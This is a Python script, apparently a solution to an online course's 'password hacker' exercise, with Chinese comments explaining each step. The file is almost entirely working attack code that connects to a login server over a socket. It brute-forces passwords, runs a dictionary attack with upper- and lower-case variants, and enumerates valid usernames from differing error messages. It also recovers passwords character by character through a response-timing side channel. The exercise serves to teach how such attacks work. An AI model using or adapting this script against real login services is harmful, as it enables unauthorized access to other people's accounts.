# write your code here
import sys
import socket
import itertools
import json
import string
from datetime import datetime
from urllib import request

ADMIN_LOGINS = r"https://stepik.org/media/attachments/lesson/255258/logins.txt"
USER_PASSWORDS = r"https://stepik.org/media/attachments/lesson/255258/passwords.txt"
BUFFER_SIZE = 1024
SUCCESS_MSG = "Connection success!"
OBTAINED_USERNAME = "Wrong password!"
CAUGHT_LETTER = "Exception happened during login"
chars = [chr(x) for x in range(97, 97 + 26)]             # chr() 将码点转为Unicode字符，得到 26个英文字符的list
chars += [str(x) for x in range(10)]                     # 将整型转为字符串类型，得到阿拉伯数字的字符的list，chars 现为 [a-z0-9]


# 获取网址的数据
def get_data_from_url(url):
    # 得到网址 url 的bytes
    data = request.urlopen(url)
    # 将 bytes 解码为字符串，去掉两边的白空格后返回该字符串
    return map(str.strip, map(bytes.decode, data))

# 暴力破解。用 26 个小写字母和 10 个数字生成随机密码
def brute_force_attack_password(hostname, port):
    # socket 连接的用法，先建一个元组，含主机和端口
    # 再打开 socket.socket()，用它的 connect 方法传入刚建的元组建立网络连接
    # 然后就可以在 socket 上面调用 send 发送编码后的 bytes
    # 再用 recv 接收 bytes
    address = (hostname, port)
    with socket.socket() as hacker:
        hacker.connect(address)
        for i in range(1, len(chars) + 1):
            for candidate in itertools.product(chars, repeat=i):  # i 为多少则生成多少位的密码
                password = "".join(candidate)
                hacker.send(password.encode())
                responses = hacker.recv(BUFFER_SIZE).decode()
                if responses == SUCCESS_MSG:
                    return password
                elif responses == "Too many attempts":
                    return False


# generate all diversity of a word
# using words as a list get the results
# 生成同一个单词的各种大小写组合放到 words 里，字母顺序不变
def recurse(convert, word, words):
    if word == "":
        words.append(convert)
        return

    if word[0].lower() == word[0].upper():
        recurse(convert + word[0], word[1:], words)
    else:
        recurse(convert + word[0].lower(), word[1:], words)
        recurse(convert + word[0].upper(), word[1:], words)


# 每次从字典文件里取一个词，然后生成该词的大小写组合来尝试破解密码
def dictionary_attack_password(hostname, port, dictionary_file):
    with open(dictionary_file) as file:
        with socket.socket() as hacker:
            hacker.connect((hostname, port))
            for line in file:
                candidates = []
                recurse("", line.strip(), candidates)
                for password in candidates:
                    hacker.send(password.encode())
                    if hacker.recv(BUFFER_SIZE).decode() == SUCCESS_MSG:
                        return password


# 判断延时是否正常，不正常表示当前位的密码字符正确，最终得到整个密码
def crack_password(connection, login_json):
    login_json["password"] = passwd = ""
    total = 0
    elapsed_time = []
    avg_consume_time = 0
    while True:
        for ch in string.printable:
            total += 1
            login_json["password"] = passwd + ch
            start = datetime.timestamp(datetime.now()) * 1000000
            # json.dumps 将字典序列化为 json字符串，再编码，发送
            connection.send(json.dumps(login_json).encode())
            srv_res = connection.recv(BUFFER_SIZE).decode()
            finish = datetime.timestamp(datetime.now()) * 1000000
            consume_time = finish - start
            if total < 20:
                elapsed_time.append(consume_time)
                avg_consume_time = sum(elapsed_time) / len(elapsed_time)
            if json.loads(srv_res).get("result") == SUCCESS_MSG:
                print(json.dumps(login_json, indent=4))
                return
            elif json.loads(srv_res).get("result") == CAUGHT_LETTER:
                passwd = login_json["password"]
                break
            if consume_time > avg_consume_time + 1000:
                # print("crack by elapsed time. avg is", avg_consume_time, "this time is", consume_time)
                passwd = login_json["password"]
                break


# 从文件里取用户名来一个个试，当提示密码错误时，表示用户名是对的，再尝试破解密码
def dict_attack_loginname(hostname, port, login_names):
    with open(login_names) as login:
        # for login in get_data_from_url(ADMIN_LOGINS):
        with socket.socket() as hacker:
            hacker.connect((hostname, port))
            login_object = {"password": "a"}
            # print("stage 1")
            for login_name in login:
                login_object["login"] = login_name.strip()
                login_json = json.dumps(login_object)
                hacker.send(login_json.encode())
                response_json = hacker.recv(BUFFER_SIZE).decode()
                # print("stage 2 server response:", response_json)
                if json.loads(response_json).get("result") == OBTAINED_USERNAME:
                    # print("stage 3 obtained username", login_name)
                    crack_password(hacker, login_object)
                    return


# 获取系统命令行的参数：python hack.py arg1 arg2 arg3
# python 不算参数，hack.py 是第一个参数，即 args[0]
args = sys.argv
if len(args) == 4:
    addr = (args[1], int(args[2]))
    with socket.socket() as client:
        client.connect(addr)
        client.send(args[3].encode())
        response = client.recv(BUFFER_SIZE)
        print(response.decode())
elif len(args) == 3:
    # print(dictionary_attack_password(args[1], int(args[2]), "passwords.txt"))
    dict_attack_loginname(args[1], int(args[2]), "logins.txt")
else:
    print("the number of arguments is wrong!!")
